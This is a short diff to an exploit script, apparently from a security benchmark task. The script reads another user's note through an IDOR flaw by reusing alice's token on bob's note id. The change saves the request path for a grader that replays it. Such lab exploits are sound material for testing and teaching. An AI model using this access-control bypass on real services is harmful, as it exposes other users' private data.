@@ -39,12 +39,16 @@ token = resp["token"]
 print("logged in as alice")
 
 # IDOR: alice's own valid token against bob's note id.
-status, resp = req("GET", "/notes/2", token=token)
-print("GET /notes/2 with alice's token ->", status, resp)
+PATH_ = "/notes/2"
+status, resp = req("GET", PATH_, token=token)
+print(f"GET {PATH_} with alice's token ->", status, resp)
 assert status == 200 and "note" in resp, (status, resp)
 
+# Hand back the REQUEST, not the note. The grader plants its own freshly
+# generated note for bob and replays this path with a session it makes itself,
+# so the note read here proves nothing to it -- only the path does.
 with open("/app/outputs/exploit_result.json", "w") as f:
-    json.dump({"secret": resp["note"]}, f)
+    json.dump({"path": PATH_}, f)
 print("wrote /app/outputs/exploit_result.json")
 PY
 
